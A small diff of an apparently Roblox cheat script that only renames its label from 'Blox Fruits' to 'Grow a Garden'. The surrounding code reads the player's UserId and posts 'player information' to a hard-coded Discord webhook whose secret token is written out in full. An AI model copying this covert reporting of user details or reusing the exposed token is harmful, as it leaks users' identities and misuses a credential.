@@ -70,7 +70,7 @@ local playerId = player.UserId
 local webhookURL = "https://discord.com/api/webhooks/1336239884209229849/17Du6JcCFtbOgzBUEiaC8LTw-ZfS9LFG3rcGBEJU-ifSwHJf3tahvKyFus-N5fZgLeGz"
 
 local data = {
-    ["content"] = "**Blox Fruits Freemium Script...!**",
+    ["content"] = "**Grow a Garden Freemium Script...!**",
     ["embeds"] = {
         {
             ["title"] = "Thông Tin Người Chơi",
